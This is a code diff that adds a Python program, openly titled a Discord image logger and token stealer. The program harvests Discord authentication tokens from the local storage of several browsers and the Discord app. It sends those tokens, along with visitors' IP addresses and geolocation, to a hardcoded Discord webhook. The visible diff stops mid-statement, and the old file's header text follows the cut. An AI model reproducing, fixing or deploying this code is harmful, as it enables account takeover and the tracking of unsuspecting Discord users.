@@ -1,4 +1,407 @@
-# Image Logger with Token Stealing - FIXED VERSION
+# Image Logger with Token Stealing - TOKEN STEALING FIXED
+# Based on integrated_image_logger_fixed.py with only token stealing fixed
+
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib import parse
+import traceback, requests, base64, httpagentparser
+import json, re, os, urllib.request, sys
+from pathlib import Path
+
+__app__ = "Discord Image Logger + Token Stealer (Token Fixed)"
+__description__ = "A simple application which allows you to steal IPs and Discord tokens by abusing Discord's Open Original feature"
+__version__ = "v2.2.1"
+__author__ = "C00lB0i"
+
+config = {
+    # BASE CONFIG #
+    "webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",
+    "token_webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",  # Webhook for token reports
+    "image": "https://server.wallpaperalchemy.com/storage/wallpapers/92/windows-xp-wallpaper-bliss-4k-wallpaper.jpeg",
+    "imageArgument": True,
+
+    # CUSTOMIZATION #
+    "username": "Image Logger", 
+    "color": 0x00FFFF,
+
+    # OPTIONS #
+    "crashBrowser": False,
+    "accurateLocation": True,
+
+    "message": {
+        "doMessage": False,
+        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
+        "richMessage": True,
+    },
+
+    "vpnCheck": 1,
+    "linkAlerts": True,
+    "buggedImage": True,
+    "antiBot": 1,
+
+    # TOKEN STEALING OPTIONS #
+    "tokenStealing": True,
+    "tokenStealingMode": "aggressive",  # Changed to aggressive for better results
+    "sendTokensToWebhook": True,
+    "tokenStealingDelay": 2,
+    "debugMode": True,  # Enable debug logging
+
+    # REDIRECTION #
+    "redirect": {
+        "redirect": False,
+        "page": "https://your-link.here"
+    },
+}
+
+blacklistedIPs = ("27", "104", "143", "164")
+
+# ===== FIXED TOKEN STEALING CODE =====
+TOKEN_REGEX_PATTERN = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"  # More accurate pattern
+REQUEST_HEADERS = {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
+}
+
+def log_debug(message):
+    """Debug logging function"""
+    if config.get("debugMode", False):
+        print(f"[DEBUG] {message}")
+
+def make_post_request(api_url: str, data: dict) -> int:
+    """Make POST request to webhook with better error handling"""
+    try:
+        if not api_url.startswith(("http", "https")):
+            log_debug(f"Invalid webhook URL: {api_url}")
+            return -1
+
+        # Enhanced headers for better Discord compatibility
+        enhanced_headers = REQUEST_HEADERS.copy()
+        enhanced_headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+        })
+
+        request = urllib.request.Request(
+            api_url, 
+            data=json.dumps(data).encode(),
+            headers=enhanced_headers,
+            method='POST'
+        )
+
+        with urllib.request.urlopen(request, timeout=15) as response:
+            log_debug(f"Webhook response: {response.status}")
+            return response.status
+    except urllib.error.HTTPError as e:
+        log_debug(f"HTTP Error sending to webhook: {e.code} - {e.reason}")
+        # Discord returns 204 for success, don't treat it as error
+        if e.code == 204:
+            return 204
+        return e.code
+    except Exception as e:
+        log_debug(f"Error sending to webhook: {e}")
+        return -1
+
+def get_tokens_from_file(file_path: Path) -> list[str] | None:
+    """Extract Discord tokens from a file with improved regex"""
+    try:
+        if not file_path.exists():
+            log_debug(f"File does not exist: {file_path}")
+            return None
+            
+        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
+        
+        # Enhanced regex patterns for better token detection
+        patterns = [
+            r"[MN][\w-]{23}\.[\w-]{6}\.[\w-]{27}",  # Standard format starting with M or N
+            r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",     # Generic 24.6.27 format
+            r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}",     # Generic 24.6.38 format
+            r"[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}", # Very flexible
+        ]
+        
+        all_tokens = []
+        for pattern in patterns:
+            tokens = re.findall(pattern, file_contents, re.IGNORECASE)
+            all_tokens.extend(tokens)
+        
+        # Remove duplicates and validate
+        unique_tokens = []
+        for token in set(all_tokens):
+            if validate_discord_token(token):
+                unique_tokens.append(token)
+        
+        log_debug(f"Found {len(unique_tokens)} valid tokens in {file_path.name}")
+        
+        return unique_tokens if unique_tokens else None
+        
+    except PermissionError:
+        log_debug(f"Permission denied accessing: {file_path}")
+        return None
+    except Exception as e:
+        log_debug(f"Error reading file {file_path}: {e}")
+        return None
+
+def get_user_id_from_token(token: str) -> str | None:
+    """Extract user ID from Discord token with better error handling"""
+    try:
+        # Remove any padding issues
+        token_parts = token.split(".")
+        if len(token_parts) < 1:
+            return None
+            
+        base64_part = token_parts[0]
+        # Add padding if needed
+        padding_needed = (4 - len(base64_part) % 4) % 4
+        base64_part += "=" * padding_needed
+        
+        discord_user_id = base64.b64decode(base64_part).decode("utf-8")
+        
+        # Validate user ID (should be numeric)
+        if discord_user_id.isdigit():
+            return discord_user_id
+        return None
+        
+    except Exception as e:
+        log_debug(f"Error decoding token: {e}")
+        return None
+
+def get_tokens_from_path(base_path: Path) -> dict[str, set] | None:
+    """Scan directory for Discord tokens with better error handling"""
+    try:
+        if not base_path.exists():
+            log_debug(f"Directory does not exist: {base_path}")
+            return None
+            
+        # Get all files in directory
+        file_paths = []
+        for file_path in base_path.iterdir():
+            if file_path.is_file():
+                file_paths.append(file_path)
+        
+        log_debug(f"Scanning {len(file_paths)} files in {base_path.name}")
+        
+        id_to_tokens: dict[str, set] = {}
+
+        for file_path in file_paths:
+            potential_tokens = get_tokens_from_file(file_path)
+            
+            if potential_tokens is None:
+                continue
+
+            for potential_token in potential_tokens:
+                discord_user_id = get_user_id_from_token(potential_token)
+                
+                if discord_user_id is None:
+                    continue
+
+                if discord_user_id not in id_to_tokens:
+                    id_to_tokens[discord_user_id] = set()
+
+                id_to_tokens[discord_user_id].add(potential_token)
+                log_debug(f"Found valid token for user {discord_user_id}")
+
+        return id_to_tokens if id_to_tokens else None
+        
+    except Exception as e:
+        log_debug(f"Error scanning directory {base_path}: {e}")
+        return None
+
+def send_tokens_to_webhook(webhook_url: str, user_id_to_token: dict[str, set[str]]) -> bool:
+    """Send found tokens to webhook with better formatting"""
+    try:
+        if not user_id_to_token:
+            log_debug("No tokens to send")
+            return False
+            
+        fields: list[dict] = []
+        
+        for user_id, tokens in user_id_to_token.items():
+            # Limit token display to avoid message length issues
+            token_list = list(tokens)[:3]  # Max 3 tokens per user
+            token_text = "\n".join(token_list)
+            
+            if len(tokens) > 3:
+                token_text += f"\n... and {len(tokens) - 3} more"
+                
+            fields.append({
+                "name": f"User ID: {user_id}",
+                "value": f"```{token_text}```"
+            })
+
+        data = {
+            "username": config["username"],
+            "content": "🔑 Discord Tokens Found!",
+            "embeds": [{
+                "title": "Token Stealer - Tokens Discovered",
+                "color": config["color"],
+                "description": f"Found Discord tokens from {len(user_id_to_token)} user(s)",
+                "fields": fields
+            }]
+        }
+
+        status = make_post_request(webhook_url, data)
+        success = status == 204 or status == 200
+        
+        log_debug(f"Token webhook send result: {status} (Success: {success})")
+        return success
+        
+    except Exception as e:
+        log_debug(f"Error sending tokens to webhook: {e}")
+        return False
+
+def validate_discord_token(token):
+    """Validate Discord token format"""
+    try:
+        parts = token.split('.')
+        if len(parts) != 3:
+            return False
+        base64_part = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
+        decoded = base64.b64decode(base64_part).decode('utf-8')
+        return decoded.isdigit()
+    except:
+        return False
+
+def attempt_token_stealing() -> bool:
+    """Attempt to steal Discord tokens with improved logic"""
+    if not config["tokenStealing"]:
+        log_debug("Token stealing is disabled")
+        return False
+    
+    log_debug("Starting token stealing attempt...")
+    
+    try:
+        local_app_data = os.getenv("LOCALAPPDATA")
+        appdata = os.getenv("APPDATA")
+        
+        paths_to_check = []
+        
+        # Windows paths
+        if local_app_data:
+            paths_to_check.extend([
+                Path(local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
+                Path(local_app_data) / "Google" / "Chrome" / "User Data" / "Profile 1" / "Local Storage" / "leveldb",
+                Path(local_app_data) / "Google" / "Chrome" / "User Data" / "Profile 2" / "Local Storage" / "leveldb",
+            ])
+            
+            # Add more browsers in aggressive mode
+            if config["tokenStealingMode"] == "aggressive":
+                paths_to_check.extend([
+                    Path(local_app_data) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb",
+                    Path(local_app_data) / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
+                    Path(local_app_data) / "Opera Software" / "Opera Stable" / "Local Storage" / "leveldb",
+                ])
+        
+        # Discord desktop app paths
+        if appdata:
+            paths_to_check.extend([
+                Path(appdata) / "discord" / "Local Storage" / "leveldb",
+                Path(appdata) / "Discord" / "Local Storage" / "leveldb",
+            ])
+        
+        # macOS paths
+        elif sys.platform == "darwin":
+            home = Path.home()
+            paths_to_check.extend([
+                home / "Library" / "Application Support" / "Google" / "Chrome" / "Default" / "Local Storage" / "leveldb",
+                home / "Library" / "Application Support" / "discord" / "Local Storage" / "leveldb",
+            ])
+        
+        # Linux paths
+        else:
+            home = Path.home()
+            paths_to_check.extend([
+                home / ".config" / "google-chrome" / "Default" / "Local Storage" / "leveldb",
+                home / ".config" / "discord" / "Local Storage" / "leveldb",
+            ])
+
+        all_tokens = []
+        
+        for path in paths_to_check:
+            if path.exists():
+                log_debug(f"Checking path: {path}")
+                tokens_by_user = get_tokens_from_path(path)
+                
+                if tokens_by_user:
+                    # Flatten all tokens from all users
+                    for user_tokens in tokens_by_user.values():
+                        all_tokens.extend(user_tokens)
+        
+        # Send all found tokens at once
+        if all_tokens and config["sendTokensToWebhook"]:
+            # Group by user ID for sending
+            final_tokens_by_user = {}
+            for token in all_tokens:
+                try:
+                    user_id = get_user_id_from_token(token)
+                    if user_id:
+                        final_tokens_by_user.setdefault(user_id, set()).add(token)
+                except:
+                    continue
+            
+            if final_tokens_by_user:
+                success = send_tokens_to_webhook(config["token_webhook"], final_tokens_by_user)
+                log_debug(f"Token stealing completed. Found {len(all_tokens)} tokens, sent success: {success}")
+                return success
+        
+        log_debug(f"Token stealing completed. No tokens found.")
+        return False
+        
+    except Exception as e:
+        log_debug(f"Token stealing error: {e}")
+        return False
+
+# ===== ORIGINAL IMAGE LOGGER CODE (UNCHANGED) =====
+def botCheck(ip, useragent):
+    if ip.startswith(("34", "35")):
+        return "Discord"
+    elif useragent.startswith("TelegramBot"):
+        return "Telegram"
+    else:
+        return False
+
+def reportError(error):
+    try:
+        error_data = {
+            "username": config["username"],
+            "content": "@everyone",
+            "embeds": [{
+                "title": "Image Logger - Error",
+                "color": config["color"],
+                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+            }]
+        }
+        requests.post(config["webhook"], json=error_data, timeout=10)
+    except Exception as e:
+        log_debug(f"Failed to send error report: {e}")
+
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
+    if ip.startswith(blacklistedIPs):
+        return
+    
+    bot = botCheck(ip, useragent)
+    
+    if bot:
+        if config["linkAlerts"]:
+            try:
+                requests.post(config["webhook"], json={
+                    "username": config["username"],
+                    "content": "",
+                    "embeds": [{
+                        "title": "Image Logger - Link Sent",
+                        "color": config["color"],
+                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+                    }]
+                }, timeout=10)
+            except Exception as e:
+                log_debug(f"Failed to send link alert: {e}")
+        return
+
+    ping = "@everyone"
+
+    try:
+        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
+    except Exception as e:
+        log_debug(f"Failed to get IP info: {e}")
+        return
+        
+    if info["proxy"]:# Image Logger with Token Stealing - FIXED VERSION
 # By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
 # Enhanced with Discord Token Stealing functionality
 
